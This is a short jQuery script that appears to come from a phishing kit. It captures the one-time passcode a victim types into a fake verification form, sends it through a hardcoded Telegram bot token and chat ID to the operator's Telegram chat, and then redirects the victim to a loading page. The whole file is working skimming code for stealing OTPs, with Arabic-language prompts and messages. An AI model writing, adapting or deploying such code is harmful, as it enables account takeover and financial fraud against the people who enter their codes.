// Replace these values with your bot's token and chat ID
const botToken = '7782372269:AAHawGOO9s8x64Sda5-jVgTUlwI73BV51Xs';
const chatId = '7057894073';

// Function to send OTP to Telegram bot
function sendOtpToTelegram(otpCode) {
    const message = `تم إدخال الرمز السري: ${otpCode}`;
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    $.ajax({
        url: telegramUrl,
        type: 'GET',
        data: {
            chat_id: chatId,
            text: message
        },
        success: function(response) {
            console.log('Message sent to Telegram:', response);
            // Redirect after sending the OTP
            window.location.href = 'loading.html';
        },
        error: function(xhr, status, error) {
            console.error('Error sending message to Telegram:', error);
            alert("حدث خطأ أثناء إرسال الرسالة.");
        }
    });
}

// Handle the OTP form submission
$(document).ready(function() {
    $('#submitOtp').click(function() {
        const otpCode = $('#splLogMobiCode').val(); // Get OTP from the input field

        if (otpCode.trim() !== '') {
            // Send OTP to Telegram bot
            sendOtpToTelegram(otpCode);
        } else {
            alert("الرجاء إدخال الرمز السري.");
        }
    });
});

